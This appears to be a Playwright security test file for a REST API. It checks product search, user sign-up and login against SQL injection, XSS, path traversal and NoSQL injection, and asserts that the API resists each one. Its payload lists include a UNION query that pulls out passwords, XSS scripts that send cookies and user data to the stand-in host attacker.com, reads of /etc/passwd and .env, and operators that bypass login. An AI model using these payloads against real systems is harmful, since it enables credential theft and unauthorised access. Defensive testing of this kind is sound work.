import { test, expect } from '@playwright/test';
import { ApiClient } from '../client/ApiClient';

test.describe('Testes de Injeção - CT-SEC', () => {
  let apiClient: ApiClient;

  test.beforeAll(async ({ request }) => {
    apiClient = new ApiClient(request);
    await apiClient.login();
  });

  test('CT-SEC-01: SQL Injection em busca de produtos', async () => {
    const legitResponse = await apiClient.get('/produtos?nome=computador');
    expect(legitResponse.status()).toBe(200);
    const legitData = await legitResponse.json();
    const legitCount = Array.isArray(legitData) ? legitData.length : 0;

    const sqlPayloads = [
      {
        name: 'OR sempre verdadeiro',
        payload: "' OR '1'='1' -- "
      },
      {
        name: 'UNION para extrair dados',
        payload: "' UNION SELECT nome, email, senha FROM usuarios -- "
      },
      {
        name: 'Comentário para ignorar cláusulas',
        payload: "nome' AND '1'='1' -- "
      },
      {
        name: 'Payload com OR 1=1',
        payload: "nome' OR 1=1 -- "
      }
    ];

    for (const sql of sqlPayloads) {
      const response = await apiClient.get(`/produtos?nome=${encodeURIComponent(sql.payload)}`);
      
      if (response.status() >= 400) {
        continue;
      }

      const body = await response.json();
      
      if (!Array.isArray(body)) {
        continue;
      }

      if (body.length > legitCount) {
        console.log(`ALERTA: SQL Injection detectada com payload: ${sql.payload}`);
        console.log(`Resultados: ${body.length} vs ${legitCount} esperados`);
        expect(body.length).toBeLessThanOrEqual(legitCount + 5);
      }

      if (body.length > 0) {
        const firstItem = body[0];
        if (firstItem && (firstItem.senha || firstItem.password || firstItem.email)) {
          console.log(`ALERTA: UNION SQL Injection detectada`);
          expect(firstItem).not.toHaveProperty('senha');
          expect(firstItem).not.toHaveProperty('password');
          expect(firstItem).not.toHaveProperty('email');
        }
      }
    }
  });

  test('CT-SEC-02: XSS em cadastro de usuário', async () => {
    const xssPayloads = [
      {
        name: 'Script tag com fetch',
        payload: `<script>fetch('/usuarios').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal', {method:'POST',body:JSON.stringify(d)}))</script>`
      },
      {
        name: 'Image onerror com exfiltração',
        payload: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
      },
      {
        name: 'SVG com script',
        payload: `<svg><script>alert(document.domain)</script></svg>`
      },
      {
        name: 'Iframe com redirect',
        payload: `<iframe src="javascript:alert('XSS')">`
      },
      {
        name: 'Event handler em body',
        payload: `<body onload="alert('XSS')">`
      },
      {
        name: 'Payload com encoding duplo',
        payload: `%3Cscript%3Ealert('XSS')%3C/script%3E`
      }
    ];

    for (const xss of xssPayloads) {
      const userData = {
        nome: xss.payload,
        email: `xss_${Date.now()}_${Math.random().toString(36).substring(7)}@test.com`,
        password: '123456',
        administrador: 'false'
      };

      const response = await apiClient.post('/usuarios', userData);
      
      if (response.status() >= 400) {
        continue;
      }

      const body = await response.json();
      
      if (!body._id) {
        continue;
      }

      const getResponse = await apiClient.get(`/usuarios/${body._id}`);
      const userBody = await getResponse.json();

      const nome = userBody.nome || '';
      
      const hasHtmlTag = /<[^>]*>/.test(nome);
      const hasEventHandler = /on\w+\s*=|javascript:/i.test(nome);
      
      if (hasHtmlTag || hasEventHandler) {
        console.log(`ALERTA: XSS detectado - payload não sanitizado: ${xss.payload}`);
        console.log(`Valor armazenado: ${nome}`);
        expect(hasHtmlTag).toBe(false);
        expect(hasEventHandler).toBe(false);
      }

      await apiClient.delete(`/usuarios/${body._id}`);
    }
  });

  test('CT-SEC-03: Path Traversal', async () => {
    const pathPayloads = [
      {
        name: 'Acesso ao /etc/passwd',
        payload: '../../../etc/passwd',
        expectedSensitive: ['root:', 'bin:', 'daemon:']
      },
      {
        name: 'Acesso ao .env',
        payload: '../../../.env',
        expectedSensitive: ['DATABASE_', 'SECRET_', 'API_']
      },
      {
        name: 'Acesso ao package.json',
        payload: '../../../package.json',
        expectedSensitive: ['dependencies', 'scripts', 'name']
      },
      {
        name: 'Path traversal com encoding',
        payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        expectedSensitive: ['root:', 'bin:', 'daemon:']
      }
    ];

    for (const path of pathPayloads) {
      const endpoints = [
        `/produtos?nome=${encodeURIComponent(path.payload)}`,
        `/usuarios?email=${encodeURIComponent(path.payload)}`
      ];

      for (const endpoint of endpoints) {
        const response = await apiClient.get(endpoint);
        
        if (response.status() >= 400) {
          continue;
        }

        const body = await response.text();
        
        for (const sensitive of path.expectedSensitive) {
          if (body.includes(sensitive)) {
            console.log(`ALERTA: Path Traversal detectado em ${endpoint}`);
            console.log(`Payload: ${path.payload}`);
            expect(body).not.toContain(sensitive);
          }
        }
      }
    }
  });

  test('CT-SEC-10: NoSQL Injection no login', async () => {
    const legitEmail = `test_${Date.now()}@test.com`;
    const legitPassword = 'senha123';
    
    await apiClient.post('/usuarios', {
      nome: 'Usuario Teste',
      email: legitEmail,
      password: legitPassword,
      administrador: 'false'
    });

    const noSqlPayloads = [
      {
        name: '$ne null em ambos campos',
        payload: { email: { '$ne': null }, password: { '$ne': null } }
      },
      {
        name: '$gt vazio',
        payload: { email: { '$gt': '' }, password: { '$gt': '' } }
      },
      {
        name: '$regex para capturar qualquer email',
        payload: { email: { '$regex': '.*' }, password: { '$regex': '.*' } }
      },
      {
        name: '$in com lista de emails',
        payload: { email: { '$in': ['admin@email.com', legitEmail] }, password: legitPassword }
      },
      {
        name: '$or para combinar condições',
        payload: { '$or': [{ 'email': legitEmail }, { 'email': { '$ne': null } }], 'password': legitPassword }
      }
    ];

    for (const noSql of noSqlPayloads) {
      const response = await apiClient.post('/login', noSql.payload);
      
      if (response.status() === 200) {
        const body = await response.json();
        
        if (body.authorization) {
          const token = body.authorization;
          const testClient = new ApiClient(apiClient.request);
          testClient.setToken(token);
          
          const protectedResponse = await testClient.get('/produtos');
          
          if (protectedResponse.status() === 200) {
            console.log(`ALERTA CRÍTICO: NoSQL Injection bem-sucedida`);
            console.log(`Payload: ${JSON.stringify(noSql.payload)}`);
            expect(response.status()).toBe(401);
          }
        }
      }
    }

    await apiClient.delete(`/usuarios?email=${encodeURIComponent(legitEmail)}`);
  });
});
